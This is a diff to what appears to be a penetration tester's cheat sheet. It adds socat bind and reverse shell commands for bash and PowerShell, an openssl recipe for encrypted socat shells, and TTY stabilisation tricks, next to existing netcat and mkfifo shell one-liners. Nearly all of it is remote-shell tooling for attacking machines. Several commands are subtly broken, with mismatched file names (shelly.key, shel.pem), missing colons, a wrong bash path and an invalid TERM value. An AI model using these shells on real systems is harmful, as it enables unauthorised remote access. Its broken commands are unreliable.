@@ -9,11 +9,38 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 1234 > /tmp/
 ```shell
 nc -nv <ip> <port>
 ```
-
+### Socat Listener 
+```cmd
+socat TCP4-LISTEN :<port> EXEC:powershell.exe,pipes
+```
+```shell
+socat TCP4-LISTEN :<port> EXEC: '/bin/bash'
+```
+### Socat Connection
+```cmd
+socat TCP4-LISTEN :<port> EXEC: '/bin/bash'
+```
+## Socat Encryption
+```shell
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+cat shelly.key shell.crt > shell.pem
+socat OPENSSL-LISTEN:<PORT>,cert=shel.pem,verify=0
+```
 # #Reverse Shell
 Attacker 
 ```shell
 sudo nc -lvnp 443
+```
+## Socat
+```shell
+socat TCP4-LISTEN:<port>
+```
+### Connection
+```cmd
+socat TCP4:<ip>:<port> EXEC:powershell.exe,pipes
+```
+```cmd
+socat TCP4:<ip><port> EXEC:`bin/bash`
 ```
 # Interactive Shells
 ```shell
@@ -79,3 +106,29 @@ ls /usr/share/nishang/Antak-WebShell
 Change username and password?
 
 #### PHP
+
+# Shell stabilisation 
+```shell
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+```ruby
+ruby -e "exec '/bin/bash'" 
+```
+```perl
+perl -e "exec '/bin/bash'"
+```
+Background the shell with 
+```
+ctrl + z
+```
+On the attackers machine
+Disables text display on the attacker machine and then resets the targets terminal
+```shell
+stty raw -echo && fg
+reset
+```
+Set the machine environment to something more appealing
+```shell
+export TERM=xterm-256-color
+```
+
